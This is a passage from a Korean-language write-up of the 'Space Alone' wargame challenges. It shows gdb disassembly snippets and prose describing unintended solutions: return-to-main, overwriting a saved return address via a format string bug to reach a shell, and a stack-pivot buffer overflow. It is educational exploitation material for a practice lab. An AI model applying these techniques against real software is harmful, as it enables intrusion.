   0x0000000000401276 <+134>:   mov    eax,0x0
   0x000000000040127b <+139>:   leave
   0x000000000040127c <+140>:   ret
```

 `loop` 체크가 `read` 위쪽에 있기 때문에 `0x401260`으로 넘어가면 됩니다. 스택 피보팅을 사용하지 않을 경우 실질적으로 사용할 수 있는 `payload`의 길이가 `0x38`로 약간 짧긴 하지만  `main`으로 여러 번 돌아가면 충분히 쉘을 딸 수 있습니다. 여전히 `sfp`를 신경 써야 하는 것은 같지만 이미 짜여져 있는 코드로 돌아가는 것이고, `Return to Main`이 더 직관적이므로 입문자 입장에서는 조금 더 쉬운 풀이가 될 것 같습니다. 저의 풀이처럼 `main`을 다시 사용하지 않고 `bss` 영역에 전체 `payload`를 짜는 것을 의도하였다면, `loop` 체크가 `read` 밑에 있어야 의도와 어울릴 것 같습니다.

Chapter 10에서 `libc got overwrite`를 사용하지 않고 풀 수 있는 방법이 두 가지 있습니다. 첫 번째는 `fsb`를 이용하여 `main` 함수 스택 프레임의 `RET`을 조작하는 것입니다. `one_gadget`을 사용하여도 좋고, `system('/bin/sh')`를 호출하는 체이닝을 짜도 좋습니다. `fsb`를 세 번이나 주어주고, `fprintf`에서 길이 `0x64`짜리 `fsb payload`를 실행시켜주므로 체이닝을 설계하기 충분할 것으로 생각됩니다. 충분한 길이를 입력받고 출력해주는 `fsb`가 세 번이나 주어진다면 보통 항상 간단하게 풀 수 있는 방법이 존재합니다. `libc got overwrite`를 의도했다면, `fsb` 횟수를 두 번으로 줄이고 `read` 크기를 줄였다면 좋았을 것 같습니다.
두 번째는 `bof`를 이용하여 스택 피보팅으로 해결하는 것입니다.

```bash
   0x000000000000170b <+323>:   lea    rax,[rbp-0x50]
   0x000000000000170f <+327>:   mov    esi,0x0
   0x0000000000001714 <+332>:   mov    rdi,rax
   0x0000000000001717 <+335>:   call   0x1315 <check_passwd>
```

`main`에서 `case 0`의 `chk_pw = check_passwd(password, 0);` 코드를 `gdb`에서 어셈블리어로 보면 위와 같습니다. `password`가 `rbp-0x50`에 정의되어 있음을 알 수 있습니다. 그런데 `check_passwd`에서 `0x64`만큼 입력받기 때문에 `bof`가 발생합니다. 카나리가 있고 `PIE`가 켜져 있다지만, 출력 가능한 `fsb`로 알아낼 수 없는 정보는 없습니다. `libc got overwrite`보다 훨씬 직관적이기 때문에 저도 태그를 참고하지 않았다면 이 방법으로 풀었을 것입니다. `fsb payload` 길이를 넉넉하게 주려다가 실수한 것 같습니다.

---
## 마무리

다양한 기법을 연습할 수 있는 구성인 것 같아 입문자에게 추천하는 `LOB`입니다. 다만, `fsb`나 `libc got overwrite`는 독학으로 이해하기 다소 어려울 수 있는데, 이 글이 이해를 도왔으면 합니다. 이미 내용을 다 안다고 해서 전혀 지루하지 않았고, 문제의 퀄리티가 꽤 높아 복습의 용도로도 활용 가능하다고 생각했습니다. 다양한 환경에서 같은 익스로 풀리는 문제를 만들기 쉽지 않은데, 제작자 분들께서 오래 고민하시고 문제를 출제한 것 같습니다. 좋은 학습 자료를 만들어주신 `Space Alone` 제작자 분들께 감사 인사를 드리며 글을 마치겠습니다. 감사합니다.